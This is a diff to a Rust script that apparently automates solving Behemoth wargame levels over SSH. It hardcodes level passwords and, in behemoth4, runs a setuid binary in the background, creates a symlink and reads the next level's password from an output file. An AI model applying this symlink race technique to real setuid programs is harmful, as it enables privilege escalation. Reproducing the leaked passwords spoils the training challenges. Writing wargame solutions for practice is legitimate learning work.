@@ -8,11 +8,12 @@ const PORT: usize = 2221;
 
 fn main() -> Result<()> {
 
-    // let pass_1 = behemoth0("behemoth0")?;
-    // let pass_2 = behemoth1(&pass_1)?;
+    //let pass_1 = behemoth0("behemoth0")?;
+    //let pass_2 = behemoth1(&pass_1)?;
     //let pass_3 = behemoth2(&pass_2)?;
     //let pass_4 = behemoth3(&pass_3)?;
-    let _pass_5 = behemoth4("kCr7E3fqaP")?;
+    //let pass_5 = behemoth4(&pass_4)?;
+    let _pass_6 = behemoth5("g4jEuK9BTU")?;
 
     Ok(())
 }
@@ -290,7 +291,7 @@ fn behemoth4(password: &str) -> Result<String> {
     read_until(&mut channel, "$ ")?;
 
     println!("starting process in background");
-    write_line(&mut channel, "bash -c 'echo $$ > test.pid && sleep 3 && exec /behemoth/behemoth4' &")?;
+    write_line(&mut channel, "bash -c 'echo $$ > test.pid && sleep 2 && exec /behemoth/behemoth4 > res.txt' &")?;
     read_until(&mut channel, "$ ")?;
 
     println!("creating symlink");
@@ -298,13 +299,23 @@ fn behemoth4(password: &str) -> Result<String> {
     read_until(&mut channel, "$ ")?;
 
     println!("waiting for result");
-    std::thread::sleep(std::time::Duration::from_secs(5));
+    std::thread::sleep(std::time::Duration::from_secs(3));
 
-    write_line(&mut channel, "")?;
+    write_line(&mut channel, "cat res.txt")?;
     let result = read_until(&mut channel, "$ ")?;
-    println!("{:?}", result);
     let result = result.split("\n").map(|s| s.trim()).find(|s| s.len() == 10).unwrap();
     println!("retrieved behemoth5 pass '{result}'\n");
 
     Ok(result.to_string())
+}
+
+fn behemoth5(password: &str) -> Result<String> {
+    
+    let session = ssh_session("behemoth5", password)?;
+    let mut channel = session.channel_session()?;
+    create_shell(&mut channel)?;
+
+    read_until(&mut channel, "$ ")?;
+
+    Ok("result".to_string())
 }
